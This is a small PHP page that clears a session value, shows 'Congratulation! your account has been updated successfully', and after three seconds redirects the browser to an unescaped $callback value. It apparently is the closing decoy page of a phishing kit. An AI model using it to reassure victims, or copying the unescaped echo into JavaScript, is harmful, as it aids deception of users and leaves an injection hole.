<?php  
include "server.php";
unset($_SESSION['pros']);
?>
<html>    
<body>
    <div style="width:50%;margin:0 auto;">
<div class="loading"><div class="load-body"><img id="load-body-img" src="loading.gif"><h1 id="loadmsg">Congratulation! your account has been updated successfully</h1></div></div>
</div>
</body>
</html>
  <script src="js/bootstrap.min.js"></script>
	 <script src="js/jquery-1.10.2.min.js"></script>
	  <script src="js/jquery-mask.js"></script>
	  	  <script src="js/load.js"></script>
	  	  <script>
		  $('.loading').show();
		  setTimeout(function(){
			  var call_back = '<?php echo $callback; ?>';
			  location = call_back;
		  },3000);
		  </script>
	  	  
	  	  